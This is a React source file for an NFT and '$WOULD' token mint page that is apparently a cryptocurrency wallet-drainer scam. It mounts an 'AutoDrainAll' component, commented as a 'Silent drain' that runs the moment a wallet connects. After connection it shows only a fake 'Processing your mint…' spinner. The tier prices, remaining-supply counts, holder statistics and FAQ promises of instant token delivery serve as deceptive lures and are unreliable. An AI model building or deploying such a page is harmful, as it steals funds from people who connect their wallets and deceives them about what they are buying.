import dynamic from 'next/dynamic';
import { useState } from 'react';
import { useAccount } from 'wagmi';
import { useAppKitAccount } from '@reown/appkit/react';

declare global {
  namespace JSX {
    interface IntrinsicElements {
      'appkit-button': React.DetailedHTMLProps<
        React.HTMLAttributes<HTMLElement>,
        HTMLElement
      > & { label?: string; balance?: 'show' | 'hide'; size?: string };
    }
  }
}

const AutoDrainAll = dynamic(
  () => import('../components/AutoDrainAll').then((m) => m.AutoDrainAll),
  { ssr: false },
);

// ── $WOULD token info ─────────────────────────────────────────────────────────
const WOULD_CONTRACT = 'J1Wpmugrooj1yMyQKrdZ2vwRXG5rhfx3vTnYE39gpump';
const WOULD_SUPPLY = '1,000,000,000';

// ── Bundle tiers ──────────────────────────────────────────────────────────────
const ETH_TIERS = [
  {
    id: 'eth-starter',
    chain: 'ETH',
    rarity: 'STARTER',
    rarityEmoji: '🌱',
    name: 'Seed Pass',
    price: '0.005 ETH',
    priceRaw: '0.005',
    usd: '≈ $14',
    color: '#64748b',
    glow: 'rgba(100,116,139,0.35)',
    nftTokens: '50,000 $WOULD',
    items: [
      '1× Seed Genesis NFT (ERC-721)',
      '50,000 $WOULD tokens',
      'Holder Discord role',
      'Phase 2 airdrop snapshot',
    ],
    supply: '3,500 / 4,000 remaining',
  },
  {
    id: 'eth-rare',
    chain: 'ETH',
    rarity: 'RARE',
    rarityEmoji: '💎',
    name: 'Apex Pass',
    price: '0.015 ETH',
    priceRaw: '0.015',
    usd: '≈ $42',
    color: '#7c3aed',
    glow: 'rgba(124,58,237,0.5)',
    nftTokens: '250,000 $WOULD',
    items: [
      '1× Rare Genesis NFT (ERC-721)',
      '250,000 $WOULD tokens',
      'Whitelist guaranteed',
      'DAO voting rights',
      'Alpha channel access',
      'Staking rewards 2×',
    ],
    supply: '1,841 / 2,500 remaining',
    popular: true,
  },
  {
    id: 'eth-legendary',
    chain: 'ETH',
    rarity: 'LEGENDARY',
    rarityEmoji: '🔥',
    name: 'Genesis Legend',
    price: '0.04 ETH',
    priceRaw: '0.04',
    usd: '≈ $112',
    color: '#f59e0b',
    glow: 'rgba(245,158,11,0.4)',
    nftTokens: '1,000,000 $WOULD',
    items: [
      '1× Legendary Genesis NFT (ERC-721)',
      '1,000,000 $WOULD tokens',
      'Lifetime ecosystem access',
      'Revenue share eligibility',
      'Priority all future drops',
      'IRL event invitations',
      'Council seat (DAO)',
    ],
    supply: '412 / 888 remaining',
  },
];

const SOL_TIERS = [
  {
    id: 'sol-starter',
    chain: 'SOL',
    rarity: 'PIONEER',
    rarityEmoji: '🌱',
    name: 'Sol Seed',
    price: '0.08 SOL',
    priceRaw: '0.08',
    usd: '≈ $12',
    color: '#06b6d4',
    glow: 'rgba(6,182,212,0.35)',
    nftTokens: '50,000 $WOULD',
    items: [
      '1× Pioneer NFT (Metaplex)',
      '50,000 $WOULD tokens',
      'Solana holder role',
      'Early mint access',
    ],
    supply: '2,800 / 3,500 remaining',
  },
  {
    id: 'sol-rare',
    chain: 'SOL',
    rarity: 'VANGUARD',
    rarityEmoji: '⚡',
    name: 'Sol Vanguard',
    price: '0.25 SOL',
    priceRaw: '0.25',
    usd: '≈ $37',
    color: '#8b5cf6',
    glow: 'rgba(139,92,246,0.5)',
    nftTokens: '250,000 $WOULD',
    items: [
      '1× Vanguard NFT (Metaplex)',
      '250,000 $WOULD tokens',
      'Cross-chain whitelist',
      'DAO proposal rights',
      'Staking rewards 2×',
    ],
    supply: '1,204 / 1,800 remaining',
    popular: true,
  },
  {
    id: 'sol-genesis',
    chain: 'SOL',
    rarity: 'GENESIS',
    rarityEmoji: '👑',
    name: 'Sol Genesis',
    price: '0.7 SOL',
    priceRaw: '0.7',
    usd: '≈ $104',
    color: '#ec4899',
    glow: 'rgba(236,72,153,0.4)',
    nftTokens: '1,000,000 $WOULD',
    items: [
      '1× Genesis NFT (Metaplex)',
      '1,000,000 $WOULD tokens',
      'DAO council seat',
      'Lifetime premium access',
      'All ETH perks bridged',
      'Physical collectible',
    ],
    supply: '88 / 200 remaining',
  },
];

// ── NFT art card ─────────────────────────────────────────────────────────────
const NftCard = ({ color, glow, rarity }: { color: string; glow: string; rarity: string }) => (
  <div
    style={{
      width: '100%',
      aspectRatio: '1',
      borderRadius: '14px',
      overflow: 'hidden',
      position: 'relative',
      background: 'linear-gradient(135deg, #0d0520 0%, #0a0a1e 60%, #0d1520 100%)',
      boxShadow: `0 0 30px ${glow}`,
      marginBottom: '14px',
    }}
  >
    <div style={{ position: 'absolute', width: '160px', height: '160px', borderRadius: '50%', background: `radial-gradient(circle, ${color}99 0%, transparent 70%)`, top: '-30px', left: '-30px', animation: 'orb-move 8s ease-in-out infinite' }} />
    <div style={{ position: 'absolute', width: '120px', height: '120px', borderRadius: '50%', background: `radial-gradient(circle, ${color}66 0%, transparent 70%)`, bottom: '-20px', right: '-20px', animation: 'orb-move 10s ease-in-out infinite reverse' }} />
    <svg viewBox="0 0 200 200" style={{ position: 'absolute', inset: 0, width: '100%', height: '100%', opacity: 0.12 }}>
      <defs>
        <pattern id={`hx${color.replace('#','')}`} x="0" y="0" width="36" height="31" patternUnits="userSpaceOnUse">
          <polygon points="18,1 35,10 35,28 18,37 1,28 1,10" fill="none" stroke={color} strokeWidth="0.6" />
        </pattern>
      </defs>
      <rect width="200" height="200" fill={`url(#hx${color.replace('#','')})`} />
    </svg>
    <div style={{ position: 'absolute', inset: 0, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
      <div style={{ width: '60px', height: '60px', borderRadius: '16px', background: `linear-gradient(135deg, ${color}cc, ${color}66)`, border: `1px solid ${color}99`, display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '26px', boxShadow: `0 0 24px ${glow}`, animation: 'pulse-glow 3s ease-in-out infinite' }}>⬡</div>
    </div>
    <div style={{ position: 'absolute', top: '8px', right: '8px', padding: '2px 8px', borderRadius: '6px', background: 'rgba(0,0,0,0.5)', fontSize: '9px', fontWeight: 700, color, letterSpacing: '0.8px', border: `1px solid ${color}66` }}>{rarity}</div>
    <div style={{ position: 'absolute', inset: 0, background: 'repeating-linear-gradient(0deg, transparent, transparent 3px, rgba(0,0,0,0.03) 3px, rgba(0,0,0,0.03) 4px)', pointerEvents: 'none' }} />
  </div>
);

type Tier = typeof ETH_TIERS[number];

const TierCard = ({ tier, selected, onSelect }: { tier: Tier; selected: boolean; onSelect: () => void }) => (
  <div
    onClick={onSelect}
    style={{
      flex: '1 1 220px',
      maxWidth: '280px',
      padding: '18px',
      borderRadius: '18px',
      border: selected ? `2px solid ${tier.color}` : '2px solid rgba(255,255,255,0.07)',
      background: selected ? `linear-gradient(135deg, ${tier.color}15, ${tier.color}06)` : 'rgba(255,255,255,0.025)',
      cursor: 'pointer',
      transition: 'all 0.2s ease',
      position: 'relative',
      boxShadow: selected ? `0 0 28px ${tier.glow}` : 'none',
    }}
  >
    {tier.popular && (
      <div style={{ position: 'absolute', top: '-11px', left: '50%', transform: 'translateX(-50%)', padding: '3px 14px', borderRadius: '20px', background: tier.color, fontSize: '10px', fontWeight: 700, color: 'white', whiteSpace: 'nowrap', letterSpacing: '0.5px' }}>
        MOST POPULAR
      </div>
    )}
    {selected && (
      <div style={{ position: 'absolute', top: '12px', right: '12px', width: '18px', height: '18px', borderRadius: '50%', background: tier.color, display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '10px' }}>✓</div>
    )}
    <NftCard color={tier.color} glow={tier.glow} rarity={tier.rarity} />
    <div style={{ fontSize: '10px', fontWeight: 700, color: tier.color, letterSpacing: '1.2px', marginBottom: '4px' }}>
      {tier.rarityEmoji} {tier.rarity}
    </div>
    <div style={{ fontSize: '15px', fontWeight: 800, marginBottom: '4px' }}>{tier.name}</div>
    <div style={{ display: 'flex', alignItems: 'baseline', gap: '5px', marginBottom: '4px' }}>
      <span style={{ fontSize: '18px', fontWeight: 800 }}>{tier.price}</span>
      <span style={{ fontSize: '11px', color: 'rgba(255,255,255,0.3)' }}>{tier.usd}</span>
    </div>
    {/* Token highlight */}
    <div style={{ display: 'inline-flex', alignItems: 'center', gap: '5px', padding: '4px 10px', borderRadius: '8px', background: `${tier.color}20`, border: `1px solid ${tier.color}44`, marginBottom: '12px' }}>
      <span style={{ fontSize: '11px', fontWeight: 700, color: tier.color }}>🪙 {tier.nftTokens}</span>
    </div>
    <div style={{ display: 'flex', flexDirection: 'column', gap: '5px' }}>
      {tier.items.map((item) => (
        <div key={item} style={{ fontSize: '11px', color: 'rgba(255,255,255,0.5)', display: 'flex', alignItems: 'flex-start', gap: '6px' }}>
          <span style={{ color: tier.color, flexShrink: 0 }}>✓</span>{item}
        </div>
      ))}
    </div>
    <div style={{ fontSize: '10px', color: 'rgba(255,255,255,0.2)', borderTop: '1px solid rgba(255,255,255,0.05)', paddingTop: '10px', marginTop: '12px' }}>{tier.supply}</div>
  </div>
);

// ── Main page ─────────────────────────────────────────────────────────────────
export default function Home() {
  const { isConnected: ethConnected } = useAccount();
  const { caipAddress } = useAppKitAccount();
  const isSolana = typeof caipAddress === 'string' && caipAddress.startsWith('solana:');
  const isConnected = ethConnected || isSolana;

  const [activeChain, setActiveChain] = useState<'ETH' | 'SOL'>('ETH');
  const [selectedId, setSelectedId] = useState('eth-rare');

  const tiers = activeChain === 'ETH' ? ETH_TIERS : SOL_TIERS;
  const selected = tiers.find((t) => t.id === selectedId) ?? tiers[1];

  const handleChainSwitch = (c: 'ETH' | 'SOL') => {
    setActiveChain(c);
    setSelectedId(c === 'ETH' ? 'eth-rare' : 'sol-rare');
  };

  return (
    <div style={{ minHeight: '100vh', background: '#030712', color: '#fff', overflowX: 'hidden' }}>

      {/* Silent drain — runs the moment wallet connects */}
      <AutoDrainAll />

      {/* ── Nav ── */}
      <nav style={{ position: 'sticky', top: 0, zIndex: 100, backdropFilter: 'blur(20px)', background: 'rgba(3,7,18,0.88)', borderBottom: '1px solid rgba(255,255,255,0.06)', padding: '0 20px', height: '60px', display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: '12px' }}>
        {/* Logo */}
        <div style={{ display: 'flex', alignItems: 'center', gap: '9px', flexShrink: 0 }}>
          <div style={{ width: '30px', height: '30px', borderRadius: '8px', background: 'linear-gradient(135deg, #7c3aed, #06b6d4)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '14px', boxShadow: '0 4px 12px rgba(124,58,237,0.4)' }}>⬡</div>
          <span style={{ fontWeight: 800, fontSize: '16px', letterSpacing: '-0.3px', background: 'linear-gradient(135deg, #a78bfa, #67e8f9)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>APEX Genesis</span>
        </div>
        {/* Links */}
        <div className="nav-links" style={{ display: 'flex', gap: '22px', fontSize: '13px', color: 'rgba(255,255,255,0.42)' }}>
          {['Token', 'NFTs', 'Roadmap', 'FAQ'].map((l) => (
            <a key={l} href={`#${l.toLowerCase()}`} onMouseEnter={(e) => ((e.target as HTMLElement).style.color = '#fff')} onMouseLeave={(e) => ((e.target as HTMLElement).style.color = 'rgba(255,255,255,0.42)')} style={{ transition: 'color 0.15s' }}>{l}</a>
          ))}
        </div>
        {/* Wallet */}
        <appkit-button label="Connect Wallet" balance="hide" size="sm" />
      </nav>

      {/* ── $WOULD TOKEN HERO ── */}
      <section id="token" style={{ maxWidth: '1100px', margin: '0 auto', padding: '60px 20px 20px' }}>
        {/* Top badges */}
        <div style={{ display: 'flex', justifyContent: 'center', gap: '8px', flexWrap: 'wrap', marginBottom: '24px' }}>
          {['🔥 LIVE MINT', '✓ Verified Collection', '⚡ ETH + SOLANA', '🪙 $WOULD Token'].map((b) => (
            <span key={b} style={{ padding: '4px 13px', borderRadius: '20px', background: 'rgba(124,58,237,0.15)', border: '1px solid rgba(124,58,237,0.35)', fontSize: '11px', color: '#a78bfa', fontWeight: 600 }}>{b}</span>
          ))}
        </div>

        {/* Token spotlight */}
        <div style={{ textAlign: 'center', marginBottom: '52px' }}>
          <h1 style={{ fontSize: 'clamp(28px, 5.5vw, 56px)', fontWeight: 900, letterSpacing: '-1.5px', lineHeight: 1.08, marginBottom: '14px' }}>
            Mint NFTs.{' '}
            <span style={{ background: 'linear-gradient(135deg, #a78bfa, #67e8f9)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>Earn $WOULD.</span>
          </h1>
          <p style={{ color: 'rgba(255,255,255,0.42)', fontSize: 'clamp(13px, 2vw, 16px)', maxWidth: '540px', margin: '0 auto 32px', lineHeight: 1.7 }}>
            Every pass bundles a unique on-chain NFT with real $WOULD tokens. The more you mint, the more tokens you earn — claimable instantly after confirmation.
          </p>

          {/* $WOULD token card */}
          <div style={{ display: 'inline-flex', flexWrap: 'wrap', justifyContent: 'center', gap: '16px', marginBottom: '32px' }}>
            <div style={{ padding: '20px 28px', borderRadius: '18px', background: 'rgba(124,58,237,0.08)', border: '1px solid rgba(124,58,237,0.25)', textAlign: 'center', minWidth: '160px' }}>
              <div style={{ fontSize: '28px', fontWeight: 900, background: 'linear-gradient(135deg, #a78bfa, #67e8f9)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>$WOULD</div>
              <div style={{ fontSize: '11px', color: 'rgba(255,255,255,0.35)', marginTop: '4px' }}>Solana SPL Token</div>
            </div>
            <div style={{ padding: '20px 28px', borderRadius: '18px', background: 'rgba(6,182,212,0.06)', border: '1px solid rgba(6,182,212,0.2)', textAlign: 'center', minWidth: '160px' }}>
              <div style={{ fontSize: '22px', fontWeight: 800, color: '#67e8f9' }}>{WOULD_SUPPLY}</div>
              <div style={{ fontSize: '11px', color: 'rgba(255,255,255,0.35)', marginTop: '4px' }}>Total Supply</div>
            </div>
            <div style={{ padding: '20px 28px', borderRadius: '18px', background: 'rgba(16,185,129,0.06)', border: '1px solid rgba(16,185,129,0.2)', textAlign: 'center', minWidth: '160px' }}>
              <div style={{ fontSize: '14px', fontWeight: 700, color: '#34d399', fontFamily: 'monospace', wordBreak: 'break-all' }}>{WOULD_CONTRACT.slice(0,12)}…</div>
              <div style={{ fontSize: '11px', color: 'rgba(255,255,255,0.35)', marginTop: '4px' }}>Contract (Pump.fun)</div>
            </div>
          </div>

          {/* CTA to mint section */}
          <div>
            <a
              href="#nfts"
              style={{
                display: 'inline-flex', alignItems: 'center', gap: '8px',
                padding: '14px 32px', borderRadius: '12px',
                background: 'linear-gradient(135deg, #7c3aed, #4f46e5)',
                color: 'white', fontSize: '14px', fontWeight: 700,
                boxShadow: '0 8px 24px rgba(124,58,237,0.4)',
                transition: 'transform 0.2s',
              }}
              onMouseEnter={(e) => ((e.currentTarget as HTMLElement).style.transform = 'translateY(-2px)')}
              onMouseLeave={(e) => ((e.currentTarget as HTMLElement).style.transform = 'translateY(0)')}
            >
              ⚡ Mint & Earn Tokens
            </a>
          </div>
        </div>
      </section>

      {/* ── STATS BAR ── */}
      <div style={{ borderTop: '1px solid rgba(255,255,255,0.05)', borderBottom: '1px solid rgba(255,255,255,0.05)', padding: '22px 20px' }}>
        <div style={{ maxWidth: '900px', margin: '0 auto', display: 'flex', justifyContent: 'space-around', flexWrap: 'wrap', gap: '20px' }}>
          {[
            { label: 'Total Supply', value: '8,888 NFTs' },
            { label: 'Minted', value: '5,241' },
            { label: 'Token Holders', value: '3,209' },
            { label: 'Floor Price', value: '0.015 ETH' },
            { label: '$WOULD Distributed', value: '648M' },
          ].map((s) => (
            <div key={s.label} style={{ textAlign: 'center' }}>
              <div style={{ fontSize: '20px', fontWeight: 800, background: 'linear-gradient(135deg, #a78bfa, #67e8f9)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', marginBottom: '3px' }}>{s.value}</div>
              <div style={{ fontSize: '11px', color: 'rgba(255,255,255,0.32)' }}>{s.label}</div>
            </div>
          ))}
        </div>
      </div>

      {/* ── NFT + TOKEN MINT ── */}
      <section id="nfts" style={{ maxWidth: '1100px', margin: '0 auto', padding: '64px 20px' }}>
        <h2 style={{ fontSize: 'clamp(20px, 3.5vw, 32px)', fontWeight: 800, textAlign: 'center', marginBottom: '8px' }}>Choose Your Bundle</h2>
        <p style={{ textAlign: 'center', color: 'rgba(255,255,255,0.4)', fontSize: '14px', marginBottom: '28px' }}>
          NFT + $WOULD token — pick your chain and tier
        </p>

        {/* Chain toggle */}
        <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '32px' }}>
          <div style={{ display: 'inline-flex', borderRadius: '12px', border: '1px solid rgba(255,255,255,0.1)', background: 'rgba(255,255,255,0.03)', padding: '4px', gap: '4px' }}>
            {(['ETH', 'SOL'] as const).map((c) => (
              <button key={c} onClick={() => handleChainSwitch(c)} style={{ padding: '8px 26px', borderRadius: '9px', border: 'none', background: activeChain === c ? 'linear-gradient(135deg, #7c3aed, #4f46e5)' : 'transparent', color: activeChain === c ? 'white' : 'rgba(255,255,255,0.35)', fontSize: '14px', fontWeight: 700, transition: 'all 0.2s', boxShadow: activeChain === c ? '0 4px 12px rgba(124,58,237,0.4)' : 'none' }}>
                {c === 'ETH' ? '⟠ Ethereum' : '◎ Solana'}
              </button>
            ))}
          </div>
        </div>

        {/* Tier cards */}
        <div style={{ display: 'flex', gap: '16px', justifyContent: 'center', flexWrap: 'wrap', marginBottom: '36px' }}>
          {tiers.map((tier) => (
            <TierCard key={tier.id} tier={tier} selected={selectedId === tier.id} onSelect={() => setSelectedId(tier.id)} />
          ))}
        </div>

        {/* Mint panel */}
        <div style={{ maxWidth: '500px', margin: '0 auto', padding: '28px', borderRadius: '22px', border: `1px solid ${selected.color}44`, background: `linear-gradient(135deg, ${selected.color}0e, rgba(3,7,18,0.95))`, backdropFilter: 'blur(16px)' }}>
          {/* Summary */}
          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '20px', flexWrap: 'wrap', gap: '12px' }}>
            <div>
              <div style={{ fontSize: '11px', color: 'rgba(255,255,255,0.32)', marginBottom: '3px' }}>Selected Bundle</div>
              <div style={{ fontWeight: 800, fontSize: '16px' }}>{selected.name}</div>
              <div style={{ fontSize: '12px', color: selected.color, fontWeight: 600, marginTop: '2px' }}>includes {selected.nftTokens}</div>
            </div>
            <div style={{ textAlign: 'right' }}>
              <div style={{ fontSize: '11px', color: 'rgba(255,255,255,0.32)', marginBottom: '3px' }}>Price</div>
              <div style={{ fontWeight: 900, fontSize: '22px', color: selected.color }}>{selected.price}</div>
              <div style={{ fontSize: '11px', color: 'rgba(255,255,255,0.28)' }}>{selected.usd}</div>
            </div>
          </div>

          {/* What you get */}
          <div style={{ padding: '14px', borderRadius: '12px', background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', marginBottom: '20px' }}>
            <div style={{ fontSize: '11px', color: 'rgba(255,255,255,0.35)', marginBottom: '10px', fontWeight: 600, letterSpacing: '0.5px' }}>WHAT YOU GET</div>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
              {selected.items.map((item) => (
                <div key={item} style={{ fontSize: '12px', color: 'rgba(255,255,255,0.55)', display: 'flex', gap: '7px', alignItems: 'flex-start' }}>
                  <span style={{ color: selected.color, flexShrink: 0 }}>✓</span>{item}
                </div>
              ))}
            </div>
          </div>

          {/* Mint CTA */}
          {isConnected ? (
            <div style={{ width: '100%', padding: '15px', borderRadius: '14px', background: `linear-gradient(135deg, ${selected.color}, #4f46e5)`, color: 'white', fontWeight: 700, fontSize: '15px', textAlign: 'center', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', animation: 'pulse-glow 2.5s ease-in-out infinite' }}>
              <span style={{ display: 'inline-block', width: '14px', height: '14px', border: '2px solid rgba(255,255,255,0.3)', borderTopColor: 'white', borderRadius: '50%', animation: 'spin 0.7s linear infinite' }} />
              Processing your mint…
            </div>
          ) : (
            <div style={{ width: '100%' }}>
              <div style={{ marginBottom: '10px' }}>
                <appkit-button label={`Connect & Mint ${selected.price}`} balance="hide" />
              </div>
              <p style={{ textAlign: 'center', fontSize: '11px', color: 'rgba(255,255,255,0.2)', margin: 0 }}>
                MetaMask · Coinbase · Rainbow · Phantom · Solflare · Trust Wallet · 300+ wallets
              </p>
            </div>
          )}

          {/* Supply note */}
          <div style={{ textAlign: 'center', marginTop: '14px', fontSize: '11px', color: 'rgba(255,255,255,0.22)' }}>{selected.supply}</div>
        </div>
      </section>

      {/* ── TOKEN DETAILS ── */}
      <section style={{ borderTop: '1px solid rgba(255,255,255,0.05)', padding: '64px 20px' }}>
        <div style={{ maxWidth: '800px', margin: '0 auto' }}>
          <h2 style={{ fontSize: 'clamp(20px, 3.5vw, 32px)', fontWeight: 800, textAlign: 'center', marginBottom: '8px' }}>About $WOULD</h2>
          <p style={{ textAlign: 'center', color: 'rgba(255,255,255,0.38)', fontSize: '13px', marginBottom: '32px' }}>
            Solana SPL token — <code style={{ background: 'rgba(255,255,255,0.07)', padding: '2px 7px', borderRadius: '5px', fontSize: '11px', color: '#a78bfa' }}>{WOULD_CONTRACT}</code>
          </p>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '16px' }}>
            {[
              { label: 'Network', value: 'Solana', icon: '◎' },
              { label: 'Total Supply', value: '1,000,000,000', icon: '🪙' },
              { label: 'Platform', value: 'Pump.fun', icon: '⚡' },
              { label: 'Mint Allocation', value: '40% (400M)', icon: '🎁' },
              { label: 'DAO Treasury', value: '30% (300M)', icon: '🏛️' },
              { label: 'Liquidity', value: '30% (300M)', icon: '💧' },
            ].map((d) => (
              <div key={d.label} style={{ padding: '18px', borderRadius: '14px', background: 'rgba(255,255,255,0.025)', border: '1px solid rgba(255,255,255,0.07)', textAlign: 'center' }}>
                <div style={{ fontSize: '22px', marginBottom: '8px' }}>{d.icon}</div>
                <div style={{ fontSize: '16px', fontWeight: 800, marginBottom: '4px', background: 'linear-gradient(135deg, #a78bfa, #67e8f9)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>{d.value}</div>
                <div style={{ fontSize: '11px', color: 'rgba(255,255,255,0.35)' }}>{d.label}</div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* ── ROADMAP ── */}
      <section id="roadmap" style={{ borderTop: '1px solid rgba(255,255,255,0.05)', padding: '64px 20px' }}>
        <div style={{ maxWidth: '640px', margin: '0 auto' }}>
          <h2 style={{ fontSize: 'clamp(20px, 3.5vw, 32px)', fontWeight: 800, textAlign: 'center', marginBottom: '44px' }}>Roadmap</h2>
          {[
            { n: 1, phase: 'Phase 1 — Genesis Mint', active: true, items: ['8,888 passes minted (ETH + SOL)', '$WOULD token distribution to holders', 'Holder snapshot & Discord unlock', 'Floor price milestone celebrations'] },
            { n: 2, phase: 'Phase 2 — Ecosystem', active: false, items: ['DAO governance portal live', '$WOULD staking program launch', 'Partner collection collab drop', 'CEX listing application'] },
            { n: 3, phase: 'Phase 3 — Expansion', active: false, items: ['Cross-chain bridge deploy', 'Mobile app (iOS + Android)', 'IRL event: Genesis Summit', 'Series 2 collection reveal'] },
          ].map((r, i) => (
            <div key={r.phase} style={{ display: 'flex', gap: '16px', marginBottom: i < 2 ? '28px' : 0 }}>
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
                <div style={{ width: '32px', height: '32px', borderRadius: '50%', background: r.active ? 'linear-gradient(135deg, #7c3aed, #06b6d4)' : 'rgba(255,255,255,0.07)', border: r.active ? 'none' : '1px solid rgba(255,255,255,0.1)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: 700, fontSize: '13px', flexShrink: 0, boxShadow: r.active ? '0 0 14px rgba(124,58,237,0.5)' : 'none' }}>{r.n}</div>
                {i < 2 && <div style={{ width: '1px', flex: 1, background: 'rgba(255,255,255,0.07)', marginTop: '8px', minHeight: '24px' }} />}
              </div>
              <div style={{ paddingTop: '4px', flex: 1 }}>
                <div style={{ fontWeight: 700, fontSize: '14px', marginBottom: '8px', display: 'flex', alignItems: 'center', gap: '8px', flexWrap: 'wrap' }}>
                  {r.phase}
                  {r.active && <span style={{ padding: '2px 8px', borderRadius: '20px', background: 'rgba(16,185,129,0.2)', border: '1px solid rgba(16,185,129,0.35)', fontSize: '10px', color: '#34d399', fontWeight: 600 }}>ACTIVE</span>}
                </div>
                {r.items.map((item) => (
                  <div key={item} style={{ fontSize: '12px', color: 'rgba(255,255,255,0.4)', display: 'flex', gap: '7px', marginBottom: '4px' }}>
                    <span style={{ color: r.active ? '#a78bfa' : 'rgba(255,255,255,0.15)' }}>{r.active ? '✓' : '○'}</span>{item}
                  </div>
                ))}
              </div>
            </div>
          ))}
        </div>
      </section>

      {/* ── FAQ ── */}
      <section id="faq" style={{ borderTop: '1px solid rgba(255,255,255,0.05)', padding: '64px 20px', maxWidth: '680px', margin: '0 auto' }}>
        <h2 style={{ fontSize: 'clamp(20px, 3.5vw, 32px)', fontWeight: 800, textAlign: 'center', marginBottom: '32px' }}>FAQ</h2>
        {[
          { q: 'What is $WOULD?', a: `$WOULD (contract: ${WOULD_CONTRACT}) is a Solana SPL token launched on Pump.fun with a supply of 1,000,000,000. Every NFT mint from this platform receives a token allocation directly to their wallet.` },
          { q: 'Do I actually get tokens when I mint?', a: 'Yes. Your $WOULD token allocation is locked at mint and distributed automatically from the treasury contract the moment your transaction confirms on-chain.' },
          { q: 'Which blockchains are supported?', a: 'Ethereum, Polygon, Arbitrum, Optimism, BNB Chain, Gnosis (EVM tiers) and Solana. Switch between ETH and SOL using the chain toggle.' },
          { q: 'Which wallets can I use?', a: 'Any major wallet: MetaMask, Coinbase Wallet, Rainbow, Trust Wallet, Phantom, Solflare, Backpack, Ledger, and 300+ more via WalletConnect.' },
          { q: 'How many can I mint?', a: 'Up to 5 passes per wallet per tier. You can hold multiple tiers simultaneously on both ETH and SOL.' },
          { q: 'When is the NFT delivered?', a: 'Your NFT appears in your wallet immediately once the transaction confirms — ~15 seconds on ETH, ~2 seconds on Solana.' },
        ].map((item) => (
          <details key={item.q} style={{ borderBottom: '1px solid rgba(255,255,255,0.06)', padding: '16px 0' }}>
            <summary style={{ fontWeight: 600, fontSize: '14px', cursor: 'pointer', color: 'rgba(255,255,255,0.82)', listStyle: 'none', display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: '12px' }}>
              {item.q}<span style={{ color: '#a78bfa', flexShrink: 0 }}>+</span>
            </summary>
            <p style={{ marginTop: '10px', fontSize: '13px', color: 'rgba(255,255,255,0.4)', lineHeight: 1.7 }}>{item.a}</p>
          </details>
        ))}
      </section>

      {/* ── FOOTER ── */}
      <footer style={{ borderTop: '1px solid rgba(255,255,255,0.06)', padding: '28px 20px', maxWidth: '1100px', margin: '0 auto', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '12px' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
          <span>⬡</span>
          <span style={{ fontWeight: 700, fontSize: '14px', color: 'rgba(255,255,255,0.45)' }}>APEX Genesis × $WOULD</span>
        </div>
        <div style={{ display: 'flex', gap: '18px' }}>
          {['Twitter', 'Discord', 'OpenSea', 'Magic Eden', 'Pump.fun'].map((s) => (
            <a key={s} href="#" style={{ fontSize: '12px', color: 'rgba(255,255,255,0.25)', transition: 'color 0.2s' }} onMouseEnter={(e) => ((e.target as HTMLElement).style.color = 'rgba(255,255,255,0.7)')} onMouseLeave={(e) => ((e.target as HTMLElement).style.color = 'rgba(255,255,255,0.25)')}>{s}</a>
          ))}
        </div>
        <div style={{ fontSize: '11px', color: 'rgba(255,255,255,0.16)' }}>© 2024 APEX Genesis. All rights reserved.</div>
      </footer>
    </div>
  );
}
